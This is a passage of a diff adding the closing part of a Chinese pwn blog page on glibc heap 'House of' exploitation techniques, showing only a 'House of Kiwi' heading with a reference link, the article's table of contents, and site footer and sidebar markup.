+<h3 id="House-of-Kiwi-1"><a href="#House-of-Kiwi-1" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/house-of-xxx/" rel="tag"># house_of_xxx</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/02/sandbox/" rel="prev" title="Sandbox的基础知识">
+      <i class="fa fa-chevron-left"></i> Sandbox的基础知识
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/02/Kernel_Basic_Knowledge/" rel="next" title="Kernel Basic Knowledge">
+      Kernel Basic Knowledge <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Spirit"><span class="nav-number">1.</span> <span class="nav-text">House of Spirit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Force"><span class="nav-number">2.</span> <span class="nav-text">House of Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Einherjar"><span class="nav-number">3.</span> <span class="nav-text">House of Einherjar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Lore"><span class="nav-number">4.</span> <span class="nav-text">House of Lore</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Orange"><span class="nav-number">5.</span> <span class="nav-text">House of Orange</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Roman"><span class="nav-number">6.</span> <span class="nav-text">House of Roman</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Rabbit"><span class="nav-number">7.</span> <span class="nav-text">House of Rabbit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Corrosion"><span class="nav-number">8.</span> <span class="nav-text">House of Corrosion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Storm"><span class="nav-number">9.</span> <span class="nav-text">House of  Storm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Kiwi"><span class="nav-number">10.</span> <span class="nav-text">House of Kiwi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Emma"><span class="nav-number">11.</span> <span class="nav-text">House of Emma</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Pig"><span class="nav-number">12.</span> <span class="nav-text">House of Pig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Banana"><span class="nav-number">13.</span> <span class="nav-text">House of Banana</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Apple"><span class="nav-number">14.</span> <span class="nav-text">House of  Apple</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Apple2"><span class="nav-number">15.</span> <span class="nav-text">House of  Apple2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Cat"><span class="nav-number">16.</span> <span class="nav-text">House of Cat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Kiwi-1"><span class="nav-number">17.</span> <span class="nav-text">House of Kiwi</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
